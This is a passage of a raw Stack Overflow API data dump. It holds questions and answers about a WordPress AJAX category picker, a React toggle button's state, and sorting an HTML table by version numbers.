die();\n}\n\nfunction getSubCat() {\n    $categories = get_categories(array (\n        'taxonomy'      =&gt; 'product_cat',\n        'hide_empty'    =&gt; 1,\n        'child_of'      =&gt; $_POST['cat_id'],\n        'parent'        =&gt; $_POST['cat_id']\n    ));\n\n    foreach ( $categories as $category ) {\n        printf( '&lt;li id=\"%1$s\" class=\"car_list_item\"&gt;&lt;a id=\"%1$s\"&gt;%2$s&lt;/a&gt;&lt;/li&gt;',\n            esc_html ($category-&gt;term_id ),\n            esc_html( $category-&gt;cat_name )\n              );\n        }\n    ?&gt; &lt;script type=\"text/javascript\"&gt;\n            (function($){\n                $(\"#third_row li\").click(function(){\n                    $(\"#fourth_row\").empty();\n                    $.ajax({\n                        type: \"post\",\n                        url: \"&lt;?php echo admin_url( 'admin-ajax.php' ); ?&gt;\",\n                        data: { action: 'get_subsubcat', cat_id: $(this).find('a').attr('id') },\n                        success: function(data) {\n                            $(\"#fourth_row\").append(data);\n                        }\n                    });\n\n                });\n            })(jQuery);\n        &lt;/script&gt; &lt;?php\n    die();\n}\n\nfunction getSubSubCat() {\n    $categories = get_categories(array (\n        'taxonomy'      =&gt; 'product_cat',\n        'hide_empty'    =&gt; 1,\n        'child_of'      =&gt; $_POST['cat_id'],\n        'parent'        =&gt; $_POST['cat_id']\n    ));\n\n    foreach ( $categories as $category ) {\n        printf( '&lt;li class=\"car_list_item\"&gt;&lt;a href=\"%1$s\"&gt;%2$s&lt;/a&gt;&lt;/li&gt;',\n        esc_url( get_category_link( $category-&gt;term_id ) ),\n            esc_html( $category-&gt;cat_name )\n              );\n        }\n\n    die();\n}\n\n}\nendif;\nnew frontendAjaxDdown();\n?&gt;\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 11028592, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-1QgsaWaJaa4/AAAAAAAAAAI/AAAAAAAAAAA/ACevoQParw2Cyv0hVcsMirP010qgBdjWVA/mo/photo.jpg?sz=128", "display_name": "Mar__co", "link": "https://stackoverflow.com/users/11028592/mar-co"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 82, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1559140849, "creation_date": 1558564820, "last_edit_date": 1558598658, "question_id": 56265873, "link": "https://stackoverflow.com/questions/56265873/jquery-click-function-for-getting-subcat-of-id-element", "title": "Jquery .click function for getting subcat of id element", "body": "<p>I try to build a car search plugin, with 3 category levels.\nLike: 1 row = Maincat, 2 row = Subcat, 3 row = Subsubcat...</p>\n\n<p>Here is an example of what i want to do:\n<a href=\"https://www.aez-wheels.com/3DKonfigurator/index.php?lcs=onz2sm13at&amp;lng=en\" rel=\"nofollow noreferrer\">https://www.aez-wheels.com/3DKonfigurator/index.php?lcs=onz2sm13at&amp;lng=en</a> </p>\n\n<p>in my code the first level appears and the second level loads. but the third level is not loading. \nI Think the problem is, that the second row is created dynamicaly. \nCan somebody tell me where i have a wrong code?</p>\n\n<pre><code>   // Loading WordPress hooks\n    function __construct()\n    {\n        add_action( 'avada_after_header_wrapper', array($this, 'llm_car_conf_list') );\n\n        // Register ajax action\n        add_action( 'wp_ajax_get_cat', array($this, 'getCat') );\n\n\n        // Register ajax action for non loged in user\n        add_action('wp_ajax_nopriv_get_cat', array($this, 'getCat') );\n\n\n    }\n\n// function for the maincat\nfunction llm_car_conf_list() { \n            if ( is_front_page() ) {?&gt;\n\n            &lt;div class=\"llm_car_container\"&gt;\n                &lt;div class=\"car_wrapper\"&gt;\n                    &lt;div class=\"car_row\"&gt;\n                        &lt;div class=\"car_title\"&gt;&lt;h2&gt;1. Fahrzeug w\u00e4hlen&lt;/h2&gt;&lt;/div&gt;\n                        &lt;ul id=\"maincat\" class=\"car_conf\"&gt;&lt;?php\n\n            $categories = get_categories(array (\n            'taxonomy'      =&gt; 'product_cat',\n            'parent'        =&gt; 0\n            ));\n\n            foreach ( $categories as $category ) {\n            printf( '&lt;li class=\"car_list_item\"&gt;&lt;a id=\"%1$s\"&gt;%2$s&lt;/a&gt;&lt;/li&gt;',\n                esc_html ($category-&gt;term_id ),\n                esc_html( $category-&gt;cat_name )\n                  );\n            }\n?&gt;&lt;/ul&gt;&lt;/div&gt;\n\n// Jquery to load first subcat\n&lt;script type=\"text/javascript\"&gt;\n                (function($){\n                    $(\"#maincat li\").click(function(){\n                        $(\"#second_row\").empty();\n                        $.ajax({\n                            type: \"post\",\n                            url: \"&lt;?php echo admin_url( 'admin-ajax.php' ); ?&gt;\",\n                            data: { action: 'get_cat', cat_id: $(this).find('a').attr('id') },\n                            success: function(data) {\n                                $(\"#second_row\").append(data);\n                            }\n                        });\n                    });\n                })(jQuery);\n            &lt;/script&gt;\n    &lt;div class=\"car_row\"&gt;\n    &lt;div class=\"car_title\"&gt;&lt;h2&gt;2. Typ w\u00e4hlen&lt;/h2&gt;&lt;/div&gt;\n    &lt;ul id=\"second_row\" class=\"car_conf\"&gt;&lt;/ul&gt;\n    &lt;/div&gt;\n\n    // Jquery to load subsubcat\n &lt;script type=\"text/javascript\"&gt;\n                (function($){\n                    $(\"#second_row li\").click(function(){\n                        $(\"#third_row\").empty();\n                        $.ajax({\n                            type: \"post\",\n                            url: \"&lt;?php echo admin_url( 'admin-ajax.php' ); ?&gt;\",\n                            data: { action: 'get_cat', cat_id: $(this).find('a').attr('id') },\n                            success: function(data) {\n                                $(\"#third_row\").append(data);\n                            }\n                        });\n\n                    });\n                })(jQuery);\n            &lt;/script&gt;\n    &lt;div class=\"car_row\"&gt;\n    &lt;div class=\"car_title\"&gt;&lt;h2&gt;3. Jahrgang w\u00e4hlen&lt;/h2&gt;&lt;/div&gt;\n    &lt;ul id=\"third_row\" class=\"car_conf\"&gt;&lt;/ul&gt;\n    &lt;/div&gt;\n\n &lt;/div&gt;\n &lt;/div&gt;\n &lt;?php \n            }\n }\n\n\n    // Function to load the subcats\n\n    function getCat() {\n        $categories = get_categories(array (\n            'taxonomy'      =&gt; 'product_cat',\n            'child_of'      =&gt; $_POST['cat_id'],\n            'parent'        =&gt; $_POST['cat_id']\n        ));\n\n        foreach ( $categories as $category ) {\n            printf( '&lt;li id=\"%1$s\" class=\"car_list_item\"&gt;&lt;a id=\"%1$s\"&gt;%2$s&lt;/a&gt;&lt;/li&gt;',\n                esc_html ($category-&gt;term_id ),\n                esc_html( $category-&gt;cat_name )\n                  );\n            }    \n        die();\n    }\n</code></pre>\n"}, {"tags": ["javascript", "reactjs", "react-native", "react-redux"], "comments": [{"owner": {"reputation": 28753, "user_id": 371184, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cebee1b08fb960edf79a359af330391a?s=128&d=identicon&r=PG", "display_name": "Mike Cluck", "link": "https://stackoverflow.com/users/371184/mike-cluck"}, "edited": false, "score": 3, "creation_date": 1558564524, "post_id": 56265834, "comment_id": 99147937, "body": "I don&#39;t know how your toggle button is setup but checkbox inputs use the <code>checked</code> attribute to indicate if they are on or off. Try changing whatever code is setting <code>value</code> to adding or removing <code>checked</code>"}], "answers": [{"tags": [], "owner": {"reputation": 139, "user_id": 8933813, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/f38b62d755cb306bc12b17f33cbd3953?s=128&d=identicon&r=PG&f=1", "display_name": "Coder95", "link": "https://stackoverflow.com/users/8933813/coder95"}, "is_accepted": false, "score": 1, "last_activity_date": 1558567697, "creation_date": 1558567697, "answer_id": 56266234, "question_id": 56265834, "link": "https://stackoverflow.com/questions/56265834/toggle-button-is-in-off-state-though-the-value-of-it-is-true/56266234#56266234", "title": "Toggle button is in off state though the value of it is true", "body": "<p>I solved the problem. Previously I was doing:</p>\n\n<pre><code>componentDidMount() {\nconst {solar} = this.props;\ndocument.addEventListener(\"keydown\", this.handleGlobalKeyDown );\nvar toggleButton = document.getElementsByName(\"toggle\")[0];\ntoggleButton.value = solar;\n}\n</code></pre>\n\n<p>I changed it to:</p>\n\n<pre><code>componentDidMount() {\nconst {solar} = this.props;\ndocument.addEventListener(\"keydown\", this.handleGlobalKeyDown );\nthis.state.checked = solar;\n}\n</code></pre>\n\n<p>And it worked!</p>\n"}], "owner": {"reputation": 139, "user_id": 8933813, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/f38b62d755cb306bc12b17f33cbd3953?s=128&d=identicon&r=PG&f=1", "display_name": "Coder95", "link": "https://stackoverflow.com/users/8933813/coder95"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 101, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1558567697, "creation_date": 1558564423, "question_id": 56265834, "link": "https://stackoverflow.com/questions/56265834/toggle-button-is-in-off-state-though-the-value-of-it-is-true", "title": "Toggle button is in off state though the value of it is true", "body": "<p>I have a switch in one of the many tabs such as Help, About etc. as shown below:</p>\n\n<p><a href=\"https://i.stack.imgur.com/yNWUQ.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/yNWUQ.png\" alt=\"enter image description here\"></a></p>\n\n<p>As you can see, the value of it is set programmatically based on a state variable in componentDidMount(). But the toggle button doesn't reflect the value accordingly. I want it to always change accordingly when the component is mounted.</p>\n"}, {"tags": ["javascript", "html"], "comments": [{"owner": {"reputation": 1765, "user_id": 3639777, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ALrZc.jpg?s=128&g=1", "display_name": "chatnoir", "link": "https://stackoverflow.com/users/3639777/chatnoir"}, "edited": false, "score": 0, "creation_date": 1558567660, "post_id": 56265784, "comment_id": 99148610, "body": "Am I missing something? Your current code already reads in the order you want:  v3.0 v2b v2a v2.0 v1.0 Work in Progress No version number Text"}, {"owner": {"reputation": 1765, "user_id": 3639777, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ALrZc.jpg?s=128&g=1", "display_name": "chatnoir", "link": "https://stackoverflow.com/users/3639777/chatnoir"}, "edited": false, "score": 0, "creation_date": 1558567878, "post_id": 56265784, "comment_id": 99148643, "body": "You want v2a to be <i>higher version</i> than v2b? And v2.0 to be <i>higher version</i> than v2a? Is that a bit counter-intuitive?"}, {"owner": {"reputation": 1024, "user_id": 3234322, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/2124b917b9e72e27168f032bb52553ac?s=128&d=identicon&r=PG&f=1", "display_name": "SeaBass", "link": "https://stackoverflow.com/users/3234322/seabass"}, "reply_to_user": {"reputation": 1765, "user_id": 3639777, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ALrZc.jpg?s=128&g=1", "display_name": "chatnoir", "link": "https://stackoverflow.com/users/3639777/chatnoir"}, "edited": false, "score": 0, "creation_date": 1558568144, "post_id": 56265784, "comment_id": 99148687, "body": "@chatnoir It is, but that&#39;s how I need to sort it."}], "answers": [{"comments": [{"owner": {"reputation": 1024, "user_id": 3234322, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/2124b917b9e72e27168f032bb52553ac?s=128&d=identicon&r=PG&f=1", "display_name": "SeaBass", "link": "https://stackoverflow.com/users/3234322/seabass"}, "edited": false, "score": 0, "creation_date": 1558568219, "post_id": 56266216, "comment_id": 99148695, "body": "Thanks! The only tweak would be to get &quot;No version number&quot;, &quot;Text&quot; and &quot;&quot; at the end. Also, does this work with v20.1a and v20.1b or is it locked to only one digit?"}, {"owner": {"reputation": 15695, "user_id": 636077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d7567fa8bd8d37173c923c75d259f104?s=128&d=identicon&r=PG", "display_name": "ray hatfield", "link": "https://stackoverflow.com/users/636077/ray-hatfield"}, "reply_to_user": {"reputation": 1024, "user_id": 3234322, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/2124b917b9e72e27168f032bb52553ac?s=128&d=identicon&r=PG&f=1", "display_name": "SeaBass", "link": "https://stackoverflow.com/users/3234322/seabass"}, "edited": false, "score": 0, "creation_date": 1558568331, "post_id": 56266216, "comment_id": 99148709, "body": "Works with any number of digits. I&#39;ll update the sample data to include multi-digit versions."}, {"owner": {"reputation": 15695, "user_id": 636077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d7567fa8bd8d37173c923c75d259f104?s=128&d=identicon&r=PG", "display_name": "ray hatfield", "link": "https://stackoverflow.com/users/636077/ray-hatfield"}, "reply_to_user": {"reputation": 1024, "user_id": 3234322, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/2124b917b9e72e27168f032bb52553ac?s=128&d=identicon&r=PG&f=1", "display_name": "SeaBass", "link": "https://stackoverflow.com/users/3234322/seabass"}, "edited": false, "score": 0, "creation_date": 1558568739, "post_id": 56266216, "comment_id": 99148771, "body": "Updated to also sort the textual items (&quot;No version number&quot;, &quot;Text&quot;, &quot;&quot;)."}, {"owner": {"reputation": 15695, "user_id": 636077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d7567fa8bd8d37173c923c75d259f104?s=128&d=identicon&r=PG", "display_name": "ray hatfield", "link": "https://stackoverflow.com/users/636077/ray-hatfield"}, "reply_to_user": {"reputation": 1024, "user_id": 3234322, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/2124b917b9e72e27168f032bb52553ac?s=128&d=identicon&r=PG&f=1", "display_name": "SeaBass", "link": "https://stackoverflow.com/users/3234322/seabass"}, "edited": false, "score": 0, "creation_date": 1558569100, "post_id": 56266216, "comment_id": 99148832, "body": "This is a weird sort, with numeric versions descending, version suffixes ascending, followed by text ascending, but with empties at the end, but I think this does what you want."}, {"owner": {"reputation": 1024, "user_id": 3234322, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/2124b917b9e72e27168f032bb52553ac?s=128&d=identicon&r=PG&f=1", "display_name": "SeaBass", "link": "https://stackoverflow.com/users/3234322/seabass"}, "edited": false, "score": 0, "creation_date": 1558570137, "post_id": 56266216, "comment_id": 99149043, "body": "Thank you so much! That looks great! Only thing is. How do I get it to work with my table? :)"}, {"owner": {"reputation": 15695, "user_id": 636077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d7567fa8bd8d37173c923c75d259f104?s=128&d=identicon&r=PG", "display_name": "ray hatfield", "link": "https://stackoverflow.com/users/636077/ray-hatfield"}, "reply_to_user": {"reputation": 1024, "user_id": 3234322, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/2124b917b9e72e27168f032bb52553ac?s=128&d=identicon&r=PG&f=1", "display_name": "SeaBass", "link": "https://stackoverflow.com/users/3234322/seabass"}, "edited": false, "score": 0, "creation_date": 1558570994, "post_id": 56266216, "comment_id": 99149184, "body": "You&#39;d modify the <code>sort</code> function to do the comparisons on the <code>textContent</code> of the cell you care about instead of operating on <code>a</code> and <code>b</code> directly. Then you&#39;d run a <code>querySelector</code> to get the rows, turn the rows into an array, and call <code>const sortedRows = rows.sort(sort)</code>, which will\u2014you guessed it\u2014return the sorted rows. Then put the sorted rows back into the table."}, {"owner": {"reputation": 15695, "user_id": 636077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d7567fa8bd8d37173c923c75d259f104?s=128&d=identicon&r=PG", "display_name": "ray hatfield", "link": "https://stackoverflow.com/users/636077/ray-hatfield"}, "reply_to_user": {"reputation": 1024, "user_id": 3234322, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/2124b917b9e72e27168f032bb52553ac?s=128&d=identicon&r=PG&f=1", "display_name": "SeaBass", "link": "https://stackoverflow.com/users/3234322/seabass"}, "edited": false, "score": 0, "creation_date": 1558574431, "post_id": 56266216, "comment_id": 99149759, "body": "I&#39;ve updated the snippet to demonstrate basic table row sorting."}, {"owner": {"reputation": 1024, "user_id": 3234322, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/2124b917b9e72e27168f032bb52553ac?s=128&d=identicon&r=PG&f=1", "display_name": "SeaBass", "link": "https://stackoverflow.com/users/3234322/seabass"}, "edited": false, "score": 0, "creation_date": 1558582605, "post_id": 56266216, "comment_id": 99151162, "body": "Thanks! I had to run it through Babel and change to the second child of the tr, but it works the way I want now!! Thank you!"}], "tags": [], "owner": {"reputation": 15695, "user_id": 636077, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d7567fa8bd8d37173c923c75d259f104?s=128&d=identicon&r=PG", "display_name": "ray hatfield", "link": "https://stackoverflow.com/users/636077/ray-hatfield"}, "is_accepted": true, "score": 1, "last_activity_date": 1558574868, "last_edit_date": 1558574868, "creation_date": 1558567555, "answer_id": 56266216, "question_id": 56265784, "link": "https://stackoverflow.com/questions/56265784/sort-table-based-on-version-number/56266216#56266216", "title": "Sort table based on version number", "body": "<p>You could split out the version number and suffix with a RegEx to ensure the numeric portion is handled correctly.</p>\n\n<p>I'm not 100% sure this snippet covers <em>every possible case</em> as written. It handles your sample data and could easily be tuned to handle edge cases if they exist.</p>\n\n<p><strike>I've omitted the DOM stuff in the interests of sorting clarity and simplicity.</strike> I've updated the snippet to demonstrate basic table sorting in addition to the raw text values.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>const values = [\r\n  \"Text\",\r\n  \"v2b\",\r\n  \"v3.0\",\r\n  \"v2a\",\r\n  \"\",\r\n  \"v2.0\",\r\n  \"v30.4alpha\",\r\n  \"No version number\",\r\n  \"v1.0 Work in Progress\",\r\n];\r\n\r\n// regex to separate the numeric version from the suffix\r\n// e.g. \"v2.0a\" =&gt; [\"2.0\", \"a\"]\r\nconst version = /v(\\d+(?:\\.\\d+)*)(.*)/;\r\n\r\nfunction getSortValue (item) {\r\n  if (item == null ) {\r\n    return item;\r\n  }\r\n  \r\n  // might want to do something more robust here.\r\n  // if it's not a string this assumes it's a tr\r\n  // and the first cell has the text we care about.\r\n  return typeof item === \"string\"\r\n    ? item\r\n    : item.firstChild.textContent;\r\n}\r\n\r\nfunction sort(av, bv) {\r\n  const a = getSortValue(av);\r\n  const b = getSortValue(bv);\r\n  \r\n  if (b &amp;&amp; !a) {\r\n    return 1;\r\n  }\r\n\r\n  if (a &amp;&amp; !b) {\r\n    return -1;\r\n  }\r\n  // get the numeric version and suffix for each item,\r\n  // OR'd with [] for cases where the regex doesn't match\r\n  const [, aVersion = 0, aSuffix = ''] = version.exec(a) || [];\r\n  const [, bVersion = 0, bSuffix = ''] = version.exec(b) || [];\r\n\r\n  // sort on the numeric portion\r\n  const versionDiff = parseFloat(bVersion) - parseFloat(aVersion);\r\n\r\n  // if the numeric versions are the same\r\n  // sort on the suffix\r\n  if (versionDiff === 0) {\r\n    return aSuffix.localeCompare(bSuffix) || a.localeCompare(b);\r\n  }\r\n\r\n  // numeric versions are different; sorting them is enough.\r\n  return versionDiff;\r\n}\r\n\r\n// sort raw text values\r\ndocument.querySelector('pre').innerHTML = JSON.stringify(values.sort(sort), null, 2);\r\n\r\n// sort table rows\r\nconst rows = Array.from(document.querySelectorAll('tr'));\r\nrows.sort(sort);\r\nconst tbody = rows[0].parentElement;\r\nrows.forEach(r =&gt; tbody.append(r));</code></pre>\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>table {\r\n  width: 100%;\r\n  font-family: monospace;\r\n  font-size: 14px;\r\n}\r\n\r\ntd {\r\n  padding: 4px 8px;\r\n}\r\n\r\ntr:nth-child(2n - 1) {\r\n  background: #eee;\r\n}</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;table id=\"versions\"&gt;\r\n\t&lt;tbody&gt;\r\n\t\t&lt;tr&gt;&lt;td&gt;Text&lt;/td&gt;&lt;/tr&gt;\r\n\t\t&lt;tr&gt;&lt;td&gt;v2b&lt;/td&gt;&lt;/tr&gt;\r\n\t\t&lt;tr&gt;&lt;td&gt;v3.0&lt;/td&gt;&lt;/tr&gt;\r\n\t\t&lt;tr&gt;&lt;td&gt;v2a&lt;/td&gt;&lt;/tr&gt;\r\n\t\t&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;\r\n\t\t&lt;tr&gt;&lt;td&gt;v2.0&lt;/td&gt;&lt;/tr&gt;\r\n\t\t&lt;tr&gt;&lt;td&gt;No version number&lt;/td&gt;&lt;/tr&gt;\r\n\t\t&lt;tr&gt;&lt;td&gt;v1.0 Work in Progress&lt;/td&gt;&lt;/tr&gt;\r\n\t&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n\r\n&lt;pre&gt;&lt;/pre&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"comments": [{"owner": {"reputation": 1024, "user_id": 3234322, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/2124b917b9e72e27168f032bb52553ac?s=128&d=identicon&r=PG&f=1", "display_name": "SeaBass", "link": "https://stackoverflow.com/users/3234322/seabass"}, "edited": false, "score": 0, "creation_date": 1558568303, "post_id": 56266236, "comment_id": 99148701, "body": "Thanks! The only change would be to get &quot;No version number&quot;, &quot;Text&quot; and &quot;&quot; at the end in that order. Also, does this work with v20.1a and v20.1b or is it locked to only one digit? Thanks!"}, {"owner": {"reputation": 7965, "user_id": 6504633, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ac20a524c7ab77fee62995c374a1f8a?s=128&d=identicon&r=PG&f=1", "display_name": "obscure", "link": "https://stackoverflow.com/users/6504633/obscure"}, "reply_to_user": {"reputation": 1024, "user_id": 3234322, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/2124b917b9e72e27168f032bb52553ac?s=128&d=identicon&r=PG&f=1", "display_name": "SeaBass", "link": "https://stackoverflow.com/users/3234322/seabass"}, "edited": false, "score": 0, "creation_date": 1558568920, "post_id": 56266236, "comment_id": 99148806, "body": "It&#39;s sorting the elements at the end in this order. Unfortunately it&#39;s locked to one digit."}], "tags": [], "owner": {"reputation": 7965, "user_id": 6504633, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ac20a524c7ab77fee62995c374a1f8a?s=128&d=identicon&r=PG&f=1", "display_name": "obscure", "link": "https://stackoverflow.com/users/6504633/obscure"}, "is_accepted": false, "score": 0, "last_activity_date": 1558568718, "last_edit_date": 1558568718, "creation_date": 1558567706, "answer_id": 56266236, "question_id": 56265784, "link": "https://stackoverflow.com/questions/56265784/sort-table-based-on-version-number/56266236#56266236", "title": "Sort table based on version number", "body": "<p>The problem is that your sorting routing just takes the second char into account so it doesn't really make a difference between 2a and 2b.</p>\n\n<p>I'd recommend constructing a decimal number out of the second char (1, 2 and 3) , the ASCII code of the next character (a, b, .) and ultimately compare these values instead.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>function sortTable(table, order, selector, target) {\r\n  selector = selector || 'th:first-child, td:first-child';\r\n  var asc = order === 'asc';\r\n  target = target || '';\r\n\r\n  var tbody = table.querySelector('tbody') || table;\r\n  var nodes = tbody.querySelectorAll('tr');\r\n  var sortedNodes = Array.prototype.slice.apply(nodes);\r\n  sortedNodes.sort(function(a, b) {\r\n    var textA = a.querySelector(selector).textContent;\r\n    var textB = b.querySelector(selector).textContent;\r\n    var temp;\r\n    var temp2;\r\n    if (target == 'versions') {\r\n      if (textA.match(/^v\\d.*/i)) {\r\n        temp2 = textA.charCodeAt(2);\r\n        if (temp2 == 46) {\r\n          temp2 = 0;\r\n        } else {\r\n          temp2 = (100 - textA.charCodeAt(2)) / 100\r\n        }\r\n        temp = (parseInt(textA.substr(1)) + temp2);\r\n        textA = temp;\r\n      }\r\n      if (textB.match(/^v\\d.*/i)) {\r\n        temp2 = textB.charCodeAt(2);\r\n        if (temp2 == 46) {\r\n          temp2 = 0;\r\n        } else {\r\n          temp2 = (100 - textB.charCodeAt(2)) / 100\r\n        }\r\n        temp = (parseInt(textB.substr(1)) + temp2);\r\n        textB = temp;\r\n      }\r\n\r\n    }\r\n    result = textA - textB;\r\n    if (isNaN(result)) {\r\n      return (asc) ? textA.toString().localeCompare(textB) : textB.toString().localeCompare(textA);\r\n    } else {\r\n      return (asc) ? -result : result;\r\n    }\r\n  });\r\n  tbody.textContent = '';\r\n  for (var i = 0; i &lt; sortedNodes.length; i++) {\r\n    tbody.appendChild(sortedNodes[i]);\r\n  }\r\n}\r\nsortTable(document.getElementById('versions'), 'asc', '', 'versions');</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;table id=\"versions\"&gt;\r\n  &lt;tbody&gt;\r\n    &lt;tr&gt;\r\n      &lt;td&gt;Text&lt;/td&gt;\r\n    &lt;/tr&gt;\r\n    &lt;tr&gt;\r\n      &lt;td&gt;v2b&lt;/td&gt;\r\n    &lt;/tr&gt;\r\n    &lt;tr&gt;\r\n      &lt;td&gt;v3.0&lt;/td&gt;\r\n    &lt;/tr&gt;\r\n    &lt;tr&gt;\r\n      &lt;td&gt;v2a&lt;/td&gt;\r\n    &lt;/tr&gt;\r\n    &lt;tr&gt;\r\n      &lt;td&gt;&lt;/td&gt;\r\n    &lt;/tr&gt;\r\n    &lt;tr&gt;\r\n      &lt;td&gt;v2.0&lt;/td&gt;\r\n    &lt;/tr&gt;\r\n    &lt;tr&gt;\r\n      &lt;td&gt;No version number&lt;/td&gt;\r\n    &lt;/tr&gt;\r\n    &lt;tr&gt;\r\n      &lt;td&gt;v1.0 Work in Progress&lt;/td&gt;\r\n    &lt;/tr&gt;\r\n  &lt;/tbody&gt;\r\n&lt;/table&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}], "owner": {"reputation": 1024, "user_id": 3234322, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/2124b917b9e72e27168f032bb52553ac?s=128&d=identicon&r=PG&f=1", "display_name": "SeaBass", "link": "https://stackoverflow.com/users/3234322/seabass"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 102, "favorite_count": 0, "accepted_answer_id": 56266216, "answer_count": 2, "score": 0, "last_activity_date": 1558574868, "creation_date": 1558564007, "last_edit_date": 1558564560, "question_id": 56265784, "link": "https://stackoverflow.com/questions/56265784/sort-table-based-on-version-number", "title": "Sort table based on version number", "body": "<p>I want to sort a table based on version number with the highest at the top. If the cell starts with \"v\" followed by a digit it's considered a version number. Otherwise it should be sorted at the bottom of the table alphabetically.</p>\n\n<p>The result is currently exactly the way I want it, except for v2.0 should come before v2a, and v2a should come before v2b. I know that my <code>parseFloat()</code> is messing that up, but how can I do this in a better way?</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>function sortTable(table, order, selector, target) {\r\n\tselector = selector || 'th:first-child, td:first-child';\r\n\tvar asc = order === 'asc';\r\n\ttarget = target || '';\r\n\t\r\n\tvar tbody = table.querySelector('tbody') || table;\r\n\tvar nodes = tbody.querySelectorAll('tr');\r\n\tvar sortedNodes = Array.prototype.slice.apply(nodes);\r\n\tsortedNodes.sort(function (a, b) {\r\n\t\tvar textA = a.querySelector(selector).textContent;\r\n\t\tvar textB = b.querySelector(selector).textContent;\r\n\t\tif( target == 'versions' )\r\n\t\t{\r\n\t\t\tif (textA.match(/^v\\d.*/i)) {\r\n\t\t\t\ttextA = parseFloat(textA.substr(1));\r\n\t\t\t}\r\n\t\t\tif (textB.match(/^v\\d.*/i)) {\r\n\t\t\t\ttextB = parseFloat(textB.substr(1));\r\n\t\t\t}\r\n\t\t\r\n\t\t}\r\n\t\tresult = textA - textB;\r\n\t\tif (isNaN(result))\r\n\t\t{\r\n\t\t\treturn (asc &amp;&amp; textB.toString() != '' ) ? textA.toString().localeCompare(textB) : textB.toString().localeCompare(textA);\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\treturn (asc) ? -result : result;\r\n\t\t}\r\n\t});\r\n\ttbody.textContent = '';\r\n\tfor (var i = 0; i &lt; sortedNodes.length; i++) {\r\n\t\ttbody.appendChild(sortedNodes[i]);\r\n\t}\r\n}\r\nsortTable(document.getElementById('versions'), 'asc', '', 'versions');</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;table id=\"versions\"&gt;\r\n\t&lt;tbody&gt;\r\n\t\t&lt;tr&gt;&lt;td&gt;Text&lt;/td&gt;&lt;/tr&gt;\r\n\t\t&lt;tr&gt;&lt;td&gt;v2b&lt;/td&gt;&lt;/tr&gt;\r\n\t\t&lt;tr&gt;&lt;td&gt;v3.0&lt;/td&gt;&lt;/tr&gt;\r\n\t\t&lt;tr&gt;&lt;td&gt;v2a&lt;/td&gt;&lt;/tr&gt;\r\n\t\t&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;\r\n\t\t&lt;tr&gt;&lt;td&gt;v2.0&lt;/td&gt;&lt;/tr&gt;\r\n\t\t&lt;tr&gt;&lt;td&gt;No version number&lt;/td&gt;&lt;/tr&gt;\r\n\t\t&lt;tr&gt;&lt;td&gt;v1.0 Work in Progress&lt;/td&gt;&lt;/tr&gt;\r\n\t&lt;/tbody&gt;\r\n&lt;/table&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": ["javascript", "bit-manipulation"], "comments": [{"owner": {"reputation": 11218, "user_id": 481248, "user_type": "registered", "profile_image": 